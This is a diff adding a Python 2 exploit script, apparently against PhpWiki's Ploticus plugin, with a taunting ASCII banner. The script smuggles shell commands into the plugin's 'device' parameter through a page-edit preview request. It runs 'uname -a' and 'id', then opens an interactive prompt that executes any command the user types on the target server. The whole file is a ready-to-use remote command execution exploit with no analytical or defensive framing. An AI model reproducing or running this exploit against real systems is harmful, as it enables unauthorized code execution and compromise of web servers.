@@ -1,0 +1,53 @@
+###############################################################
+#    ____                    __                  _ __   _ 
+#   / __/_  ______ _  ____  / /_  ____ _      __(_) /__(_)
+#  / /_/ / / / __ `/ / __ \/ __ \/ __ \ | /| / / / //_/ / 
+# / __/ /_/ / /_/ / / /_/ / / / / /_/ / |/ |/ / / ,< / /  
+#/_/  \__,_/\__, (_) .___/_/ /_/ .___/|__/|__/_/_/|_/_/   
+#             /_/ /_/         /_/                     
+# Diskovered in Nov/Dec 2011
+###############################################################
+
+import urllib
+import urllib2
+import sys
+def banner():
+	print "	    ____                    __                  _ __   _ "
+	print "	   / __/_  ______ _  ____  / /_  ____ _      __(_) /__(_)"
+	print "	  / /_/ / / / __ `/ / __ \/ __ \/ __ \ | /| / / / //_/ / "
+	print "	 / __/ /_/ / /_/ / / /_/ / / / / /_/ / |/ |/ / / ,< / /  "
+	print "	/_/  \__,_/\__, (_) .___/_/ /_/ .___/|__/|__/_/_/|_/_/   "
+	print "	             /_/ /_/         /_/                     \n"
+
+
+def usage():
+	banner()
+	print "	[+] Usage example"
+	print "	[-] python " + sys.argv[0] + " http://path.to/wiki"
+
+if len(sys.argv)< 2:
+	usage()
+	quit()
+
+domain = sys.argv[1]
+def commandexec(cmd):
+	data = urllib.urlencode([('pagename','HeIp'),('edit[content]','<<Ploticus device=";echo 123\':::\' 1>&2;'+cmd+' 1>&2;echo \':::\'123 1>&2;" -prefab= -csmap= data= alt= help= >>'),('edit[preview]','Preview'),('action','edit')])
+	cmd1 = urllib2.Request(domain +'/index.php/HeIp',data)
+	cmd2 = urllib2.urlopen(cmd1)
+	output = cmd2.read()
+	firstloc = output.find("123:::\n") + len("123:::\n")
+	secondloc = output.find("\n:::123")
+	return output[firstloc:secondloc]
+
+
+banner()
+print commandexec('uname -a')
+print commandexec('id')
+while(quit != 1):
+	cmd = raw_input('Run a command: ')
+	if cmd == 'quit':
+		print "[-] Hope you had fun :)"
+		quit = 1
+	if cmd != 'quit':
+		print commandexec(cmd)
+
